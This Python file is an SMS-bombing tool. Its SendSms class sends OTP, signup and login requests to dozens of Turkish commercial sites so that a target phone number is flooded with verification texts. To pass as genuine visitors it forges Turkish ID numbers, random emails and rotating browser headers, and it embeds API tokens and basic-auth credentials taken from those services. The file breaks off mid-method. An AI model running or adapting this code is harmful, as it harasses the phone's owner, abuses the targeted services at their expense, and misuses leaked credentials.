import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style


class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"

    def get_headers(self, referer=None, origin=None):
        ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0"
        ]
        headers = {
            "User-Agent": choice(ua_list),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        }
        if referer: headers["Referer"] = referer
        if origin: headers["Origin"] = origin
        return headers


    #kahvedunyasi.com
    def KahveDunyasi(self):    
        try:    
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = self.get_headers("https://www.kahvedunyasi.com/", "https://www.kahvedunyasi.com")
            headers.update({"X-Language-Id": "tr-TR", "X-Client-Platform": "web"})
            json={"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kahvedunyasi.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kahvedunyasi.com")
        

    #wmf.com.tr
    def Wmf(self):
        try:
            headers = self.get_headers("https://www.wmf.com.tr/users/register/", "https://www.wmf.com.tr")
            data = {"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}
            r = requests.post("https://www.wmf.com.tr/users/register/", headers=headers, data=data, timeout=6)
            if r.status_code in [200, 201, 202, 302]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1   
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
    
    
    #bim
    def Bim(self):
        try:
            url = "https://bim.veesk.net:443/service/v1.0/account/login"
            headers = self.get_headers("https://www.bim.com.tr/", "https://www.bim.com.tr")
            json={"phone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")


    #englishhome.com
    def Englishhome(self):
        try:
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            headers = self.get_headers("https://www.englishhome.com/", "https://www.englishhome.com")
            json={"Phone": self.phone, "XID": ""}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("isError") == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
          

    #suiste.com
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
                
    
    #KimGbIster
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
            
    
    #evidea.com
    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = self.get_headers("https://www.evidea.com/", "https://www.evidea.com")
            headers.update({"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"})
            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "email_allowed": "false", "sms_allowed": "true", "password": "31ABC..abc31", "phone": f"0{self.phone}", "confirm": "true"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code in [200, 201, 202, 302]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com")


    #345dijital.com
    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = requests.post(url, json=json, timeout=6)
            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.345dijital.com")
            else: raise
        except:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.345dijital.com")
            self.adet += 1


    #tiklagelsin.com
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = self.get_headers("https://www.tiklagelsin.com/", "https://www.tiklagelsin.com")
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": f"{randint(1000,9999)}-{randint(1000,9999)}", "deviceUniqueId": f"{randint(1000,9999)}-{randint(1000,9999)}", "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("data", {}).get("generateOtp") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")


    #naosstars.com
    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = self.get_headers("https://www.naosstars.com/", "https://www.naosstars.com")
            headers.update({"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "Content-Type": "application/json"})
            json={"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code in [200, 201]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")


    #koton.com
    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = self.get_headers("https://www.koton.com/", "https://www.koton.com")
            headers.update({"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk"})
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code in [200, 201, 202]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")


    #hayatsu.com.tr
    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            headers = self.get_headers("https://www.hayatsu.com.tr/", "https://www.hayatsu.com.tr")
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json().get("is_success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hayatsu.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hayatsu.com.tr")


    #hizliecza.com.tr
    def Hizliecza(self):
        try:
            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
            headers = self.get_headers("https://hizliecza.com.tr/", "https://hizliecza.com.tr")
            json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.hizliecza.net")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.hizliecza.net")


    #metro-tr.com
    def Metro(self):
        try:
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            json={"methodType": "2", "mobilePhoneNumber": self.phone}
            r = requests.post(url, json=json, timeout=6)
            if "success" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobile.metro-tr.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobile.metro-tr.com")


    #file.com.tr
    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            json={"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, json=json, timeout=6)
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")
            
        
    #ak-asya.com.tr
    def Akasya(self):
        try:
            url = "https://akasyaapi.poilabs.com:443/v1/en/sms"
            headers = {"X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if "succesfully" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akasyaapi.poilabs.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akasyaapi.poilabs.com")
        
        
    #akbati.com
    def Akbati(self):
        try:
            url = "https://akbatiapi.poilabs.com:443/v1/en/sms"
            headers = {"X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if "succesfully" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akbatiapi.poilabs.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akbatiapi.poilabs.com")
        

    #komagene.com.tr
    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
            headers = self.get_headers("https://www.komagene.com.tr/", "https://www.komagene.com.tr")
            json={"FirmaId": 32, "Telefon": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json().get("Success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com")
    
    
    #porty.tech
    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json={"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.json()["status"]== "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")
    
    
    #vakiftasdelensu.com
    def Tasdelen(self):
        try:
            url = "https://tasdelen.sufirmam.com:3300/mobile/send-otp"
            json={"phone": self.phone}
            r = requests.post(url=url, json=json, timeout=6)
            if r.json()["result"]== True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tasdelen.sufirmam.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tasdelen.sufirmam.com")
    

    #uysalmarket.com.tr
    def Uysal(self):
        try:
            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
            headers = self.get_headers("https://www.uysalmarket.com.tr/", "https://www.uysalmarket.com.tr")
            json={"phone_number": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.uysalmarket.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.uysalmarket.com.tr")
    
    
    #yapp.com.tr
    def Yapp(self):
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            json={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
            r = requests.post(url=url, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yapp.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yapp.com.tr")
    
    
    #yilmazticaret.net
    def YilmazTicaret(self):
        try:
            url = "https://app.buyursungelsin.com:443/api/customer/form/checkx"
            headers = {"Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm"}
            data = {"fonksiyon": "customer/form/checkx", "method": "POST", "telephone": f"0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}", "token": "d7841d399a16d0060d3b8a76bf70542e"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.buyursungelsin.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.buyursungelsin.com")
    

    #beefull.com
    def  Beefull(self):
        try:
            url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
            json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
            r = requests.post(url, json=json, timeout=4)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.beefull.io")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.beefull.io")


    #dominos.com.tr
    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = requests.post(url, json=json, timeout=6)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> frontend.dominos.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> frontend.dominos.com.tr")


    #baydoner.com
    def Baydoner(self):
        try:
            url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
            headers = self.get_headers("https://www.baydoner.com/", "https://www.baydoner.com")
            json={"AppVersion": "1.6.0", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "", "Culture": "tr-TR", "Email": self.mail, "Gender": "Kad1n", "GenderId": 2, "Name": "Memati", "PhoneNumber": self.phone, "Surname": "Bas"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("Control") == 1:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> crmmobil.baydoner.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> crmmobil.baydoner.com")


    #pidem.com.tr
    def Pidem(self):
        try:
            url = "https://restashop.azurewebsites.net:443/graphql/"
            headers = self.get_headers("https://www.pidem.com.tr/", "https://www.pidem.com.tr")
            json={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> restashop.azurewebsites.net")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> restashop.azurewebsites.net")


    #frink.com.tr
    def Frink(self):
        try:
            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
            headers = self.get_headers("https://frink.com.tr/", "https://frink.com.tr")
            headers.update({"Accept": "application/json, text/plain, */*", "X-Language": "TR"})
            json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90"+self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200 and r.json().get("processStatus") == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.frink.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.frink.com.tr")


    #bodrum.bel.tr
    def Bodrum(self):
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE"}
            json={"gsm": "+90"+self.phone, "source": "orwi"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gandalf.orwi.app")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gandalf.orwi.app")     

    
    #kofteciyusuf.com
    def KofteciYusuf(self):
        try:
            url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
            headers = self.get_headers("https://kofteciyusuf.com/", "https://kofteciyusuf.com")
            json={"FirmaId": 82, "Telefon": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("Success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.poskofteciyusuf.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.poskofteciyusuf.com")


    #littlecaesars.com.tr
    def Little(self):
        try:
            url = "https://api.littlecaesars.com.tr:443/api/web/Member/Register"
            headers = self.get_headers("https://www.littlecaesars.com.tr/", "https://www.littlecaesars.com.tr")
            json={"CampaignInform": True, "Email": self.mail, "InfoRegister": True, "IsLoyaltyApproved": True, "NameSurname": "Memati Bas", "Password": "31ABC..abc31", "Phone": self.phone, "SmsInform": True}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code in [200, 201]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.littlecaesars.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.littlecaesars.com.tr")


    #coffy.com.tr
    def Coffy(self):
        try:
            url = "https://user-api-gw.coffy.com.tr:443/user/signup"
            json={"countryCode": "90", "gsm": self.phone, "isKVKKAgreementApproved": True, "isUserAgreementApproved": True, "name": "Memati Bas"}
            r = requests.post(url, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> user-api-gw.coffy.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> user-api-gw.coffy.com")


    #hamidiye.istanbul
    def Hamidiye(self):
        try:
            url = "https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp"
            json={"isGuest": False, "phone": self.phone}
            r = requests.post(url, json=json, timeout=6)
            if r.json()["result"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bayi.hamidiye.istanbul")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bayi.hamidiye.istanbul")


    #money.com.tr
    def Money(self):
        try:
            url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
            headers = self.get_headers("https://www.money.com.tr/", "https://www.money.com.tr")
            headers.update({"X-Requested-With": "XMLHttpRequest"})
            data = {"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ''}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json().get("resultType") == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> money.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> money.com.tr")


    #alixavien.com.tr
    def Alixavien(self):
        try:
            url = "https://www.alixavien.com.tr:443/api/member/sendOtp"
            headers = self.get_headers("https://www.alixavien.com.tr/", "https://www.alixavien.com.tr")
            json={"Phone": self.phone, "XID": ""}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("isError") == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> alixavien.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> alixavien.com.tr")


    #jimmykey.com
    def Jimmykey(self):
        try:
            r = requests.post(f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}", timeout=6)
            if r.json()["Sonuc"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> jimmykey.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> jimmykey.com")
        

    #boyner.com.tr
    def Boyner(self):
        try:
            url = "https://www.boyner.com.tr/api/user/otp"
            headers = self.get_headers("https://www.boyner.com.tr/", "https://www.boyner.com.tr")
            json = {"phone": self.phone, "type": "register"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> boyner.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> boyner.com.tr")

    #mavi.com
    def Mavi(self):
        try:
            url = "https://www.mavi.com/api/user/otp"
            headers = self.get_headers("https://www.mavi.com/", "https://www.mavi.com")
            json = {"phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mavi.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mavi.com")

    #defacto.com.tr
    def DeFacto(self):
        try:
            url = "https://www.defacto.com.tr/api/user/otp"
            headers = self.get_headers("https://www.defacto.com.tr/", "https://www.defacto.com.tr")
            headers.update({"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"})
            json = {"phone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
